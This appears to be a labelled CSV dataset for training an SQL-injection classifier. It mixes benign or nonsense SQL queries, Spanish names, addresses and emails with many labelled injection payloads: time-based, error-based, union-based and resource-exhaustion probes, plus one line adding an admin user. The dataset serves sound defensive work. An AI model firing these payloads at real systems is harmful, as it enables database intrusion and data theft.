select sport ( s )  from average select usual from weigh,0,0,0.0
"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  5132  =  5132",1,1,1.0
select fell from single union all select crew from stomach order by aboard,0,0,0.0
select * from satellites order by concerned,0,0,0.0
select * from compound where little = 'itself' fetch first 3 rows only,0,0,0.0
"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1,1,1.0
"-3609""   )    )    as fzyp where 9474  =  9474 or 9323  =  9323#",1,1,1.0
-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,1,1,1.0
rupp@djbroadcast.gov,0,0,0.004468253314358248
select * from  ( select discuss from quietly ) ,0,0,0.0
" select * from afraid order by wonderful asc, leaf desc",0,0,0.0
oco,0,0,0.004468253314358248
-8639  )   or 8138  =  6252,1,1,1.0
select * from breeze where cost = 'mighty' limit 3,0,0,0.0
" select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",1,1,1.0
fla,0,0,0.004468253314358248
select avg ( tired ) from worker select sum ( rocket ) ,0,0,0.0
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",1,1,1.0
select count ( distinct weight )  from quickly,0,0,0.0
40592671v,0,0,0.004468253314358248
select * from claws  where boy not like '[thus]%',0,0,0.0
select baseball from teacher union all select yellow from does order by without,0,0,0.0
"  select alike,tell,pile from usually left join orders on yesterday.silkid =  feet.zero order by steady.hill",0,0,0.0
"1 where 8074  =  8074 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,1.0
" select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",1,1,1.0
from  ( select distinct struggle from church ) ,0,0,0.0
3.62829e+15,0,0,0.0
select * from thick fetch first 3 rows only,0,0,0.0
"1 where 7072  =  7072 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,1.0
1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,1,1,1.0
select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,1,1,1.0
"1%' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '%'  =  '",1,1,1.0
"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",1,1,1.0
select * from pony where perhaps = 'ship' fetch first 3 rows only,0,0,0.0
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,1,1.0
ario,0,0,0.004468253314358248
"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1,1,1.0
"-9557  )   where 2891  =  2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--",1,1,1.0
"1"" where 1166  =  1166",1,1,1.0
"-8709"" or 8571  =  8571--",1,1,1.0
vilma,0,0,0.004468253314358248
"  select orders.streamrid, employees.run, employees.wear from ordersright join employees on orders.employeeid  =  employees.catid order by orders.unusualid",0,0,0.0
1   )    )     )   order by 1#,1,1,1.0
"-7889""   )    )    as oayf where 1765  =  1765 or 8571  =  8571--",1,1,1.0
"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",1,1,1.0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c885367717' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0,0,0.0
select wide ( s )  from west,0,0,0.0
978,0,0,0.004468253314358248
"1""  )   as piwi where 2918  =  2918",1,1,1.0
"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
"-9928""   )    )    union all select 7511,7511,7511,7511,7511,7511,7511,7511#",1,1,1.0
"1%""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,1,1.0
"select * from easily where kind between ""sunlight"" and    ""till""",0,0,0.0
rainmake,0,0,0.004468253314358248
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """,1,1,1.0
itziar,0,0,0.004468253314358248
-2806'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'rxzr'  =  'rxzr,1,1,1.0
"c/ torcuato perez, 69,",0,0,0.02
select film ( s )  from getting union all,0,0,0.0
select * from wing fetch first 50 percent rows only,0,0,0.0
-4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc,1,1,1.0
ddimo,0,0,0.004468253314358248
select sail ( s )  from mouse union all,0,0,0.0
1   )    )    as xmac where 7692  =  7692,1,1,1.0
"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",1,1,1.0
1'+  (  select 'vnue' where 5807  =  5807,1,1,1.0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",1,1,1.0
"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,1.0
"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # lgoz",1,1,1.0
trilles aedo,0,0,0.004468253314358248
"  update they set or =  'golden', city =  'path' where us =  onto",0,0,0.12
"1 where 1776  =  1776 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
belia,0,0,0.004468253314358248
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # yoch,1,1,1.0
"pl. san marcos, 0, 11f",0,0,0.03916666666666666
select top 3 * from load where several = 'film',0,0,0.0
jeft,0,0,0.004468253314358248
repuesta,0,0,0.004468253314358248
9.49221e+15,0,0,0.0
select * from colony  where cook = everybody,0,0,0.0
select * from satellites fetch first 3 rows only,0,0,0.0
"1"" where 5977  =  5977",1,1,1.0
select top 3 * from radio select * from pipe 3select * from quickly,0,0,0.0
gallinero de cameros,0,0,0.0
c/ cofa 39,0,0,0.0
"  select dinnerid as id, stranger as language from heavy",0,0,0.0
"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,1,1.0
1'  )   where 3893  =  3893,1,1,1.0
batido,0,0,0.004468253314358248
3.19537e+15,0,0,0.0
olmos de ojeda,0,0,0.0
-2790'   )    )    or 8571  =  8571--,1,1,1.0
fresno de la vega,0,0,0.0
barruecopardo,0,0,0.004468253314358248
select * from zero fetch first 3 rows only,0,0,0.0
select top 50 percent * from present select * from ate fetch first 50 percent rows onlyselect top 3 * from water,0,0,0.0
25613,0,0,0.004468253314358248
if  (  6554  =  1534  )   select 6554 else drop function buqb--,1,1,1.0
"insert into refused  ( angry, from, rhyme )  values  ( 'fly', 'chicken', 'team' )  ",0,0,0.0
"1""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
servitje areggiani,0,0,0.004468253314358248
"   select employees.almost, count ( orders.largeid )  as micefrom    ( ordersinner join powerful on orders.dishid  =  employees.didid ) ",0,0,0.0
from  ( select distinct wealth from planet ) ,0,0,0.0
"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
 update cave set deal = 'needs'where finger = 'sunlight',0,0,0.0
select length from funny,0,0,0.0
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,1,1.0
select * from stronger where using = 'getting'  or duty = 'molecular',0,0,0.0
"1""   )    )    as sqow where 8752  =  8752",1,1,1.0
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""wtkx""  =  ""wtkx",1,1,1.0
select * from grade fetch first 50 percent rows only,0,0,0.0
3.24209e+15,0,0,0.0
delete from herd where mine = 'bush',0,0,0.0
select * from nearer where not useful = 'sold'  and not example = 'circle',0,0,0.0
*|,1,0,0.0
"c/ juan ramon jimenez, 135, 11d",0,0,0.0
"1%""   )    )     )   and 7758  =  4792 and    (    (     (  ""%""  =  """,1,1,1.0
select * from row where weight between 'fire' and 'progress',0,0,0.0
select avg ( till ) from practical,0,0,0.0
kingston@professionalhost.com.ag,0,0,0.0
"select column1 , column2, ... from table_name where condition1 and condition2 and condition3 ... ;",0,0,0.17
"select count  (  *  )   from generate_series  (  1,5000000  )  ",1,1,0.83
"-6731"" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166--",1,1,1.0
select avg ( skill ) from tower select sum ( great ) ,0,0,0.0
select * from pretty,0,0,0.0
1'+  (  select 'jaok' where 2592  =  2592,1,1,1.0
select avg ( planning ) from language select sum ( sense ) ,0,0,0.0
select * from coal order by beside desc,0,0,0.0
"c/ luarca, 151, 7?g",0,0,0.0
select avg ( principal ) from house select sum ( feature ) ,0,0,0.0
15819331t,0,0,0.004468253314358248
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- cbsd",1,1,1.0
"-4091   )    )    as lqqy where 3030  =  3030 union all select 3030,3030,3030#",1,1,1.0
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""jcgh""  =  ""jcgh",1,1,1.0
select avg ( price ) from hand,0,0,0.0
"-7568""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""jxge"" like ""jxge",1,1,1.0
babasaki,0,0,0.004468253314358248
lorber-albasiny@cortinasartesol.pa,0,0,0.006527024015406931
select tr.object_id from wp_term_relationships as tr inner join wp_term_taxonomy as tt on tr.term_taxonomy_id  =  tt.term_taxonomy_id where tt.taxonomy in  ( 'nav_menu' )  and tt.term_id in  ( '715' )  order by tr.object_id asc,0,0,0.06
"  select tired as history, slide as [too]  from plenty",0,0,0.0
guasca,0,0,0.004468253314358248
"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
"1' where 9241  =  9241 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
"-6186' in boolean mode  )   union all select 2990,2990,2990#",1,1,1.0
"  (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,1,0.92
select * from vowel  where soil = giving,0,0,0.0
50490,0,0,0.004468253314358248
select apart ( s )  from plant left join,0,0,0.0
"urbanitzacio las lomas, 18, 4a",0,0,0.004468253314358248
15990,0,0,0.004468253314358248
"   select box,driving,represent,noise,doctor     (  (  deer join lead on neck.dust =  scared.teeth )   inner join peton orders.central =  likely.continentid ) ",0,0,0.0
"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'niro'  =  'niro",1,1,1.0
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'raus'  =  'raus",1,1,1.0
fitness,0,0,0.004468253314358248
select * from floating where occasionally = 'built' fetch first 3 rows only,0,0,0.0
select avg ( too ) from gas,0,0,0.0
vizcaya,0,0,0.004468253314358248
"-4340   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   8505  =  8505",1,1,0.99
select option_value from wp_options where option_name  =  'options_location_address' limit 1,0,0,0.0
select * from rain where movement = 'garden' fetch first 3 rows only,0,0,0.0
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",1,1,1.0
"1""  )   where 5358  =  5358",1,1,1.0
"select * from return where medicine between ""darkness"" and    ""guard""",0,0,0.0
"insert into daughter ( star, star, attached, water, thing, press )  values  ( 'brown', 'lovely'. breath', 'throat', 'planet', 'drink', 'fourth' )  ",0,0,0.0
" || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1,1,0.8400414421881476
select * from gun where thy = 'surface'  or compass = 'total',0,0,0.0
1' rlike   (  select   (  case when   (  1916  =  7874  )   then 1 else 0x28 end   )    )    and 'ughq'  =  'ughq,1,1,1.0
select count ( funny )  from understanding,0,0,0.0
"  update hot set fat =  'wash', city =  'band' where almost =  root",0,0,0.0
select   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  select 2161 from mysql.db  )   end  )  #,1,1,1.0
48289,0,0,0.004468253314358248
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'uwep'  =  'uwep",1,1,1.0
select * from baseball order by giving desc,0,0,0.0
1   )    )    and 7533  =  7533 and    (    (   8738  =  8738,1,1,0.99
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   ",1,1,1.0
handy.leleu@chevrolet-volt.gob,0,0,0.006527024015406931
select count ( * )  as known,0,0,0.0
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",1,1,1.0
"1""   )    )    as tkmd where 3415  =  3415 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1,1.0
select top 3 * from habit,0,0,0.0
select gave ( s from lady right join,0,0,0.0
select * from operation where greatest = 'strip' limit 3,0,0,0.0
38948590e,0,0,0.004468253314358248
symen,0,0,0.004468253314358248
8.23106e+15,0,0,0.0
select * from observe where golden = 'various'  and  ( character = 'gain' or ball = 'dirty' ) ,0,0,0.0
select count ( practice ) from believed,0,0,0.0
"-2964""   )    )    order by 1--",1,1,1.0
"  select orders.riderid, employees.soon, employees.diagram from ordersright join employees on orders.employeeid  =  employees.seemsid order by orders.featureid",0,0,0.0
"-5041'   )    )     )   union all select 4820,4820,4820,4820,4820,4820--",1,1,1.0
select top 50 percent * from neighbor select * from bone fetch first 50 percent rows onlyselect top 3 * from shoot,0,0,0.0
1%' and 2006  =  2006,1,1,0.9501050672016443
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""uzjn""  =  ""uzjn",1,1,1.0
from  ( select distinct house from shelf ) ,0,0,0.0
select * from meat where slave = 'ask'  or vertical = 'section',0,0,0.0
mamantona,0,0,0.004468253314358248
"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",1,1,1.0
"-3315""   )    )     )   union all select 2457,2457,2457,2457,2457,2457--",1,1,1.0
select * from value,0,0,0.0
select * from bill where cover not like 'industry%',0,0,0.0
"1%""   )    )    union all select null,null,null,null#",1,1,1.0
2.4571e+15,0,0,0.0
sandler,0,0,0.004468253314358248
"-7240'   )    )    union all select 8064,8064,8064#",1,1,1.0
1   )    )    union all select null--,1,1,1.0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual# gnga",1,1,1.0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo",1,1,1.0
"1'||  (  select 'fcnb' where 2869  =  2869 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1,1,1.0
"  select weightid as id, think as window from plane",0,0,0.0
1'+  (  select soqk where 5383  =  5383,1,1,1.0
select * from example where castle not between 'silly' and 'addition',0,0,0.0
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl",1,1,1.0
"  select halfwayid as id, pen as point from three",0,0,0.0
gayle@freetag.name,0,0,0.09077753673096116
"1%""   )    )    union all select null,null,null,null,null,null,null#",1,1,1.0
"-8655  )   where 3910  =  3910 union all select 3910,3910#",1,1,1.0
select * from highway where    not exact = 'percent',0,0,0.0
select avg ( won ) from foreign,0,0,0.0
globula*riceo,0,0,0.0
7.38083e+15,0,0,0.0
select tight from tears,0,0,0.0
-2374  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  2576  =  2576,1,1,1.0
monopolizador,0,0,0.004468253314358248
pacn,0,0,0.004468253314358248
26064480y,0,0,0.004468253314358248
"1'||  (  select 'ftey' where 1363  =  1363 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1,1,1.0
pl9t1r4,0,0,0.004468253314358248
29691,0,0,0.004468253314358248
1 or sleep  (  __time__  )  #,1,1,0.99
"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,1.0
select * from fed where tightly not like '[former]%',0,0,0.0
"  select * from layers where dropped in  ( 'cold', 'population', 'path' )  ",0,0,0.0
1'  )   and 2577  =  7094,1,1,1.0
select * from length where not pen = 'none'  and not case = 'powerful',0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 11635 )  order by meta_id asc",0,0,0.0
"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",1,1,1.0
-1300  )   as rrsm where 1086  =  1086 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,1,1.0
select * from  ( select result from meal ) ,0,0,0.0
1   )    )    as muyz where 6105  =  6105,1,1,1.0
2a6in6rosa,0,0,0.004468253314358248
"1%""   )    )    union all select null,null,null,null,null,null,null,null--",1,1,1.0
select * from brother where occasionally = 'visitor' limit 3,0,0,0.0
bidaurreta,0,0,0.004468253314358248
7.51221e+15,0,0,0.0
"  select trip,shore from answer where gulf = 'more' union select record, melted from tea",0,0,0.0
"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ocfi'  =  'ocfi",1,1,1.0
"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1,1.0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""mofa"" like ""mofa",1,1,1.0
1'+  (  select 'fqkk' where 9725  =  9725,1,1,1.0
bolly,0,0,0.004468253314358248
follosas,0,0,0.004468253314358248
select case when 9848  =  2618 then 1 else null end--,1,1,1.0
"select * from generate_series  (  1488,1488,case when   (  1488  =  1685  )   then 1 else 0 end  )   limit 1--",1,1,1.0
"-2701""   )    )    as wvht where 5401  =  5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",1,1,1.0
"1""  )   where 1673  =  1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1.0
select * from aid where    not wealth = 'long',0,0,0.0
gabby,0,0,0.004468253314358248
"-7295""  )   or 9323  =  9323#",1,1,1.0
select distinct brush from huge,0,0,0.0
8.81212e+15,0,0,0.0
lazure,0,0,0.004468253314358248
select * from compare where journey = 'improve'  and city = 'trick',0,0,0.0
select * from grandfather where party = 'family' limit 3,0,0,0.0
select * from order where running between '1996-07-01' and '1996-07-31',0,0,0.0
select * from hurry where scientific between '1996-07-01' and '1996-07-31',0,0,0.0
aldebar,0,0,0.004468253314358248
"select t.*, tt.*, tr.object_id from wp_terms as t inner join wp_term_taxonomy as tt on t.term_id  =  tt.term_id inner join wp_term_relationships as tr on tr.term_taxonomy_id  =  tt.term_taxonomy_id where tt.taxonomy in  ( 'agent_category', 'agent_city' )  and tr.object_id in  ( 28313, 28341 )  order by t.name asc",0,0,0.03
sabionda,0,0,0.004468253314358248
select avg ( white ) from tight,0,0,0.0
"-5825  )   as mflf where 3999  =  3999 or make_set  (  1492  =  7153,7153  )  --",1,1,0.99
select * from productswhere price between 10 and 20;,0,0,0.0
540,0,0,0.004468253314358248
28614822q,0,0,0.004468253314358248
mahbeer,0,0,0.004468253314358248
preixens,0,0,0.004468253314358248
select avg ( melted ) from greatly,0,0,0.0
"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",1,1,1.0
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,1,1,1.0
#name?,0,1,0.6503555108868124
9751,0,0,0.004468253314358248
select connection_id (  ) ;,0,0,0.0
"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,1,1,1.0
select avg ( price ) from sun,0,0,0.0
"-7802'   )    )     )   or elt  (  8778  =  9974,9974  )   and    (    (     (  'glsq' like 'glsq",1,1,1.0
39696,0,0,0.004468253314358248
select * from [brazil   customers];,0,0,0.0
select avg ( price ) from day,0,0,0.0
select come from realize union select instrument from fly order by sell,0,0,0.0
select but ( s ) from cake inner join,0,0,0.0
1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,1,1,1.0
37609,0,0,0.004468253314358248
"insert into were  ( tightly, must, house )  values  ( 'weight', 'because', 'mad' )  ",0,0,0.0
esc2n3alosa5e4te,0,0,0.004468253314358248
"-4705' where 2029  =  2029 union all select 2029,2029,2029#",1,1,1.0
"select date_sub ( ""2017-06-15 09:34:21"", interval 15 minute ) ;",0,0,0.0
select pg_sleep  (  5  )   and   (  '%'  =  ',1,1,0.99
17489,0,0,0.004468253314358248
delete from dull,0,0,0.0
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,1,1,1.0
8.11985e+15,0,0,0.0
"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
1'   )    )    as dipp where 1714  =  1714,1,1,1.0
select * from anybody where not truck = 'tone'  and not zipper = 'build',0,0,0.0
select arrangement ( s )  from ocean full outer join,0,0,0.0
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'xkxi' like 'xkxi",1,1,1.0
select plane from equipment union all select but from contrast order by birds,0,0,0.0
fina,0,0,0.004468253314358248
select * from sitting where north = 'subject' fetch first 3 rows only,0,0,0.0
delete from shinning,0,0,0.0
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,1,1.0
select out ( s )  from afternoon,0,0,0.0
a8o8decer,0,0,0.004468253314358248
select * from congress 3 select * from page,0,0,0.0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",1,1,1.0
"1'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
butts@maxtienda.na,0,0,0.004468253314358248
8arrascal485,0,0,0.004468253314358248
villanueva de huerva,0,0,0.0
"  select fall,empty from language where darkness = 'distant' union select way, never from made",0,0,0.0
select option_value from wp_options where option_name  =  '_houzez_property_type_2766' limit 1,0,0,0.0
select night ( s )  from notice union,0,0,0.0
16813,0,0,0.004468253314358248
select tool ( s )  from list select exact ( s ) ,0,0,0.0
select top 3 * from greatest where western = 'brave' select * from record,0,0,0.0
select avg ( for ) from verb select sum ( drink ) ,0,0,0.0
"1'||  (  select 'alxi' where 3967  =  3967 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
1  )   as zodp where 9112  =  9112,1,1,1.0
select * from driving where habit not between 'fully' and 'chart',0,0,0.0
&1c,1,0,0.004468253314358248
select * from knew where smooth = 'track' fetch first 3 rows only,0,0,0.0
1'  )   rlike   (  select   (  case when   (  2721  =  8716  )   then 1 else 0x28 end   )    )    and   (  'dumt'  =  'dumt,1,1,1.0
"   select count ( about ) , sunlight from anywhere by together",0,0,0.0
select top 3 * from volume,0,0,0.0
"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",1,1,1.0
select * from capital where grabbed = 'fighting' limit 3,0,0,0.0
select * from upward fetch first 50 percent rows onlyselect top 3 * from ask,0,0,0.0
select * from parallel fetch first 50 percent rows onlyselect top 3 * from upper,0,0,0.0
select min ( air )  as refer from refused,0,0,0.0
-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,1,1.0
select * from finish fetch first 50 percent rows onlyselect top 3 * from shop,0,0,0.0
"  select shellsid as id, nice as dangerous from travel",0,0,0.0
select count ( cross )  from grabbed,0,0,0.0
select top 50 percent * from whole,0,0,0.0
-2569' union all select 4484--,1,1,1.0
2l04a8,0,0,0.004468253314358248
"  select * from bite where explanation not in  ( 'pig', 'station', 'western' )  ",0,0,0.0
select * from judge fetch first 3 rows only select top 50 percent * from troops,0,0,0.0
1'||  (  select 'mlwj' from dual where 4247  =  4247 and 1702  =  8469  )  ||',1,1,0.99
select * from some where paint = 'composition' fetch first 3 rows only,0,0,0.0
select top 3 * from pull select * from discover 3select * from canal,0,0,0.0
select tightly,0,0,0.03250505488953901
select * from pack where price not between 10 and 20,0,0,0.0
"calle florian de ocampo 114, 7?h",0,0,0.0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""%""  =  """,1,1,1.0
"   select loud, fair+ ', ' + familiar+ ' ' + lunch+ ', ' + fence as captured  from organized",0,0,0.0
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",1,1,1.0
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,1,1,1.0
" select * from his order by gulf, perfectly",0,0,0.0
select halfway ( s ) from spread inner join,0,0,0.0
"1,  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1,0.98
